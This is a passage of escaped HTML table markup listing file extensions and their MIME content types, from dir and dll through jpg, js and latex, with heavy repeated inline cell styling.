style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">dir</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-director</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">dll</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-msdownload</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">dms</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/octet-stream</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">doc</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/msword</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">dot</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/msword</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">dvi</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-dvi</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">dxr</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-director</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">eps</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/postscript</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">etx</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/x-setext</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">evy</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/envoy</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">exe</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/octet-stream</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">fif</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/fractals</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">flr</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">x-world/x-vrml</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">gif</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/gif</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">gtar</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-gtar</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">gz</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-gzip</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">h</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/plain</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">hdf</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-hdf</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">hlp</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/winhlp</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">hqx</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/mac-binhex40</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">hta</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/hta</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">htc</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/x-component</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">htm</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/html</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">html</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/html</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">htt</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">text/webviewhtml</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ico</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/x-icon</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ief</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/ief</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">iii</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-iphone</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">ins</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-internet-signup</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">isp</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-internet-signup</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">jfif</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/pipeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">jpe</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/jpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">jpeg</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/jpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">jpg</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">image/jpeg</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">js</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-javascript</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">latex</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">application/x-latex</td></tr><tr><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; BORDER-LEFT: #aaaaaa 1px solid; PADDING-BOTTOM: 5px; BACKGROUND-COLOR: #efefef; PADDING-LEFT: 5px; PADDING-RIGHT: 15px; VERTICAL-ALIGN: text-top; BORDER-TOP: #aaaaaa 1px solid; BORDER-RIGHT: #aaaaaa 1px solid; PADDING-TOP: 5px\\">lha</td><td style=\\"BORDER-BOTTOM: #aaaaaa 1px solid; 